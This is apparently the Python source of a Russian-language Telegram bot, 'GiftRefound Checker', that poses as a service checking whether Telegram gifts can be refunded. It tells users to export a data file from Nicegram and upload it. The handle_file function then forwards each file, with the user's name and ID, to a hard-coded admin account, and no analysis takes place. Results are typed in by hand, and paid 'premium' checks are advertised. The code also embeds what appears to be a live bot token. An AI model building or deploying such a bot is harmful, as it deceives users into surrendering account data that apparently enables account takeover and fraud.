import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import sqlite3
from datetime import datetime

# Настройка логирования
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

BOT_TOKEN = "7956796612:AAFRjhOw_4yT0039kOnmMHQEdoDrJchT3go"
ADMIN_ID = 8362897345
DB = "refound_bot.db"

def init_db():
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS checks (
            user_id INTEGER,
            username TEXT,
            file_id TEXT,
            status TEXT,
            check_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    keyboard = [
        [InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound")],
        [InlineKeyboardButton("📖 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton("💎 Премиум проверка", callback_data="premium")],
        [InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support")]
    ]
    
    caption = """
🎁 <b>Добро пожаловать в GiftRefound Checker!</b>

Здесь ты можешь проверить любой Telegram-подарок на возможность возврата перед покупкой!

🔍 <b>Проверка покажет:</b>
• Возможен ли возврат подарка
• Историю предыдущих возвратов  
• Риски при покупке
• Рекомендации по безопасности

⚡ <b>Как это работает?</b>
1. Скачиваешь файл данных из Nicegram
2. Отправляешь его боту
3. Получаешь детальный анализ!

🛡️ <b>Покупай с уверенностью!</b>
    """
    
    await update.message.reply_photo(
        photo="https://i.postimg.cc/gXgxWWVs/design-image.jpg",
        caption=caption,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )

async def check_refound(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    instruction_text = """
📁 <b>Отправьте файл данных Nicegram</b>

1. Откройте Nicegram
2. Зайдите в Настройки → Nicegram 
3. Нажмите "Экспортировать в файл"
4. Отправьте полученный файл сюда

⏳ <b>Проверка займет 5-10 минут</b>
После анализа вы получите полный отчет.
    """
    
    await query.edit_message_caption(
        caption=instruction_text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")]
        ]),
        parse_mode="HTML"
    )

async def instruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    instruction_text = """
📖 <b>Инструкция по проверке:</b>

1. <b>Скачайте Nicegram</b>
   - Нажмите кнопку ниже для скачивания

2. <b>Экспортируйте данные:</b>
   - Откройте Nicegram
   - Настройки → Nicegram
   - "Экспортировать в файл"

3. <b>Отправьте файл боту</b>
   - Вернитесь в этого бота
   - Нажмите "Проверить на Refound"
   - Отправьте полученный файл

4. <b>Получите результат</b>
   - Анализ займет 5-10 минут
   - Вы получите детальный отчет
    """
    
    keyboard = [
        [InlineKeyboardButton("📱 Скачать Nicegram", url="https://nicegram.app")],
        [InlineKeyboardButton("🔍 Проверить файл", callback_data="check_refound")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")]
    ]
    
    await query.edit_message_caption(
        caption=instruction_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )

async def premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    premium_text = """
💎 <b>Премиум проверка</b>

<b>Что входит:</b>
• Приоритетная обработка (2-3 минуты)
• Расширенный анализ истории
• Персональные рекомендации
• Поддержка 24/7

<b>Стоимость:</b>
• 1 проверка - 50 руб
• 5 проверок - 200 руб

💬 <b>Для активации напишите в поддержку</b>
    """
    
    await query.edit_message_caption(
        caption=premium_text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("👨‍💻 Написать в поддержку", url="https://t.me/your_support")],
            [InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")]
        ]),
        parse_mode="HTML"
    )

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    support_text = """
👨‍💻 <b>Поддержка</b>

По всем вопросам обращайтесь:
• По поводу проверок
• Технические проблемы  
• Премиум доступ

📞 <b>Связь:</b>
@your_support_username
    """
    
    await query.edit_message_caption(
        caption=support_text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 Написать", url="https://t.me/your_support_username")],
            [InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")]
        ]),
        parse_mode="HTML"
    )

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    keyboard = [
        [InlineKeyboardButton("🔍 Проверить на Refound", callback_data="check_refound")],
        [InlineKeyboardButton("📖 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton("💎 Премиум проверка", callback_data="premium")],
        [InlineKeyboardButton("👨‍💻 Поддержка", callback_data="support")]
    ]
    
    caption = """
🎁 <b>Добро пожаловать в GiftRefound Checker!</b>

🔍 Проверяй подарки перед покупкой!
⚡ Быстро и надежно!
🛡️ Покупай с уверенностью!
    """
    
    await query.edit_message_caption(
        caption=caption,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML"
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    await update.message.reply_text(
        "🔍 <b>Файл получен! Начинаем проверку...</b>\n\n"
        "⏳ <b>Примерное время:</b> 5-10 минут\n"
        "📊 <b>Статус:</b> Анализ данных...\n\n"
        "Мы пришлем вам результат как только проверка будет завершена!",
        parse_mode="HTML"
    )
    
    admin_text = f"""
📨 <b>Новый файл для проверки!</b>

👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
🆔 <b>ID:</b> {user.id}
📅 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💾 <b>Файл:</b> {update.message.document.file_name}
    """
    
    try:
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=update.message.document.file_id,
            caption=admin_text,
            parse_mode="HTML"
        )
        
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO checks (user_id, username, file_id, status) VALUES (?, ?, ?, ?)",
            (user.id, user.username, update.message.document.file_id, "pending")
        )
        conn.commit()
        conn.close()
        
        logger.info(f"Файл от {user.id} переслан админу")
        
    except Exception as e:
        logger.error(f"Ошибка пересылки файла: {e}")
        await update.message.reply_text("❌ Ошибка при обработке файла. Попробуйте позже.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data == "check_refound":
        await check_refound(update, context)
    elif data == "instruction":
        await instruction(update, context)
    elif data == "premium":
        await premium(update, context)
    elif data == "support":
        await support(update, context)
    elif data == "back_to_menu":
        await back_to_menu(update, context)

async def send_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /result <user_id> <текст результата>")
        return
    
    user_id = int(args[0])
    result_text = " ".join(args[1:])
    
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"📊 <b>Результат проверки:</b>\n\n{result_text}",
            parse_mode="HTML"
        )
        await update.message.reply_text("✅ Результат отправлен пользователю")
        
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute(
            "UPDATE checks SET status = ? WHERE user_id = ? AND status = ?",
            ("completed", user_id, "pending")
        )
        conn.commit()
        conn.close()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

def main():
    init_db()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("result", send_result))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    print("✅ Бот для проверки Refound запущен!")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
